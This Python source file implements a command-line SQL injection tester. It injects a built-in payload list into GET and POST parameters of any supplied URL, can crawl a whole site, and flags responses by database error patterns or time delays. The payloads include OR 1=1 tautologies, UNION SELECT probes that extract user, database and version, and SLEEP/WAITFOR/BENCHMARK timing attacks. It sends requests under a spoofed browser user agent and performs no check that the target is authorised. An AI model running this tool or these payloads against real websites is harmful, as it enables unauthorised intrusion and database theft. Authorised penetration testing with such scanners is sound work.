import argparse
import requests
import re
import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from null_point_theme import print_banner, print_success, print_error, print_input, print_info
from typing import List, Dict, Optional, Tuple, Any

class SQLiTester:
    def __init__(self):
        self.vulnerable_urls = []
        self.tested_urls = []
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "') OR ('a'='a",
            "\") OR (\"a\"=\"a",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' UNION SELECT null--",
            "1' UNION SELECT null,null--",
            "1' UNION SELECT null,null,null--",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT user(),database(),version()--",
            "1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' OR SLEEP(5)--",
            "1' OR BENCHMARK(10000000,MD5('test'))--"
        ]
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"ODBC Microsoft Access Driver",
            r"Microsoft SQL Native Client error",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"DB2 SQL error",
            r"Oracle error",
            r"SQLite.Exception",
            r"Syntax error.*SQLite",
            r"SQL command not properly ended",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"Fatal error",
            r"supplied argument is not a valid MySQL result resource",
            r"Division by zero in"
        ]
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        self.time_based_delay = 3  # seconds for time-based detection
        self.timeout = 5  # request timeout in seconds

    def scan_url(self, url, params=None, cookies=None):
        """Scan a single URL for SQL injection vulnerabilities"""
        print_info(f"Testing URL: {url}")
        
        # Test GET parameters
        if '?' in url:
            base_url, query = url.split('?', 1)
            param_dict = {}
            for pair in query.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    param_dict[key] = value
            
            for param in param_dict:
                original_value = param_dict[param]
                for payload in self.payloads:
                    param_dict[param] = original_value + payload
                    new_query = '&'.join([f"{k}={v}" for k, v in param_dict.items()])
                    test_url = f"{base_url}?{new_query}"
                    self._test_injection(test_url, param, payload, cookies)
                param_dict[param] = original_value
        
        # Test POST parameters if provided
        if params:
            for param in params:
                original_value = params[param]
                for payload in self.payloads:
                    params[param] = original_value + payload
                    self._test_injection(url, param, payload, cookies, data=params)
                params[param] = original_value
        
        # If no parameters, just test the URL as is
        if '?' not in url and not params:
            for payload in self.payloads:
                test_url = url + payload
                self._test_injection(test_url, "URL", payload, cookies)

    def _test_injection(self, url: str, param: str, payload: str, cookies: Optional[Dict[str, str]] = None, data: Optional[Dict[str, Any]] = None) -> None:
        """Test a specific URL with a payload"""
        if url in self.tested_urls:
            return
        self.tested_urls.append(url)

        print_info(f"[TESTING] {url}")
        
        try:
            headers = {'User-Agent': self.user_agent}
            
            # Time-based detection
            time_based_payloads = ["' OR SLEEP(5)--", "\" OR SLEEP(5)--", 
                                  "'; WAITFOR DELAY '0:0:5'--", "\"; WAITFOR DELAY '0:0:5'--"]
            
            if payload in time_based_payloads:
                start_time = time.time()
                requests.get(url, params=data, headers=headers, cookies=cookies, timeout=self.timeout)
                elapsed = time.time() - start_time
                
                if elapsed >= self.time_based_delay:
                    print_error(f"Potential time-based SQLi in {param} with payload: {payload}")
                    self.vulnerable_urls.append((url, param, payload, "Time-based delay detected"))
                    return
            
            # Regular error-based detection
            if data:
                response = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=self.timeout)
            else:
                response = requests.get(url, headers=headers, cookies=cookies, timeout=self.timeout)
            
            # Check for error messages
            content = response.text.lower()
            for pattern in self.error_patterns:
                if re.search(pattern.lower(), content):
                    print_error(f"Potential SQLi in {param} with payload: {payload}")
                    print_info(f"Error pattern matched: {pattern}")
                    self.vulnerable_urls.append((url, param, payload, f"Error pattern: {pattern}"))
                    break
            
        except requests.exceptions.RequestException as e:
            print_error(f"Error testing {url}: {e}")
        except Exception as e:
            print_error(f"Unexpected error: {e}")

    def crawl_and_test(self, base_url: str, max_pages: int = 10) -> None:
        """Crawl a website and test all found URLs"""
        print_info(f"Starting crawl of {base_url} (max {max_pages} pages)")
        
        visited = set()
        to_visit = set([base_url])
        domain = urlparse(base_url).netloc
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop()
            
            if url in visited:
                continue
                
            visited.add(url)
            print_info(f"Crawling: {url}")
            
            try:
                response = requests.get(url, headers={'User-Agent': self.user_agent}, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Test this page
                self.scan_url(url)
                
                # Find all links on the page
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urljoin(url, href)
                    
                    # Only follow links within the same domain
                    if urlparse(absolute_url).netloc == domain:
                        to_visit.add(absolute_url)
                        
            except requests.exceptions.RequestException as e:
                print_error(f"Error crawling {url}: {e}")
            
            time.sleep(1)  # Be polite

import io
from contextlib import redirect_stdout

# ... existing imports and code ...

def run_tool(url: str) -> str:
    f = io.StringIO()
    with redirect_stdout(f):
        tester = SQLiTester()
        tester.scan_url(url)
        # Summary
        print("\n" + "=" * 50)
        print(f"Total URLs tested: {len(tester.tested_urls)}")
        print(f"Potential vulnerabilities found: {len(tester.vulnerable_urls)}\n")
        if tester.vulnerable_urls:
            print("Potential SQL Injection Vulnerabilities:")
            for u, param, payload, reason in tester.vulnerable_urls:
                print(f"\nURL: {u}")
                print(f"Parameter: {param}")
                print(f"Payload: {payload}")
                print(f"Reason: {reason}")
                print("-" * 50)
    return f.getvalue()

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Tester Tool')
    parser.add_argument('url', nargs='?', help='URL to test')
    parser.add_argument('-c', '--crawl', action='store_true', help='Crawl the website and test all pages')
    parser.add_argument('-p', '--params', help='POST parameters to test (format: param1=val1,param2=val2)')
    parser.add_argument('-C', '--cookies', help='Cookies to send (format: name1=val1;name2=val2)')
    
    args = parser.parse_args()

    print_banner("SQL Injection Tester Tool")

    url = args.url
    if not url:
        url = print_input("Enter target URL -> ").strip()
    
    if not url:
        print_error("No URL provided. Exiting.")
        return

    tester = SQLiTester()
    
    # Parse cookies if provided
    cookies = {}
    if args.cookies:
        for pair in args.cookies.split(';'):
            if '=' in pair:
                name, value = pair.split('=', 1)
                cookies[name.strip()] = value.strip()
    
    # Parse POST parameters if provided
    post_params = {}
    if args.params:
        for pair in args.params.split(','):
            if '=' in pair:
                name, value = pair.split('=', 1)
                post_params[name.strip()] = value.strip()
    
    if args.crawl:
        tester.crawl_and_test(url)
    else:
        if post_params:
            tester.scan_url(url, params=post_params, cookies=cookies)
        else:
            tester.scan_url(url, cookies=cookies)
    
    # Print summary
    print_success("Scan Complete")
    print("=" * 50)
    print(f"Total URLs tested: {len(tester.tested_urls)}")
    print(f"Potential vulnerabilities found: {len(tester.vulnerable_urls)}\n")
    
    if tester.vulnerable_urls:
        print_error("Potential SQL Injection Vulnerabilities:")
        for url, param, payload, reason in tester.vulnerable_urls:
            print(f"\nURL: {url}")
            print(f"Parameter: {param}")
            print(f"Payload: {payload}")
            print(f"Reason: {reason}")
            print("-" * 50)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_info("Scan interrupted by user")
    except Exception as e:
        print_error(f"An error occurred: {e}")

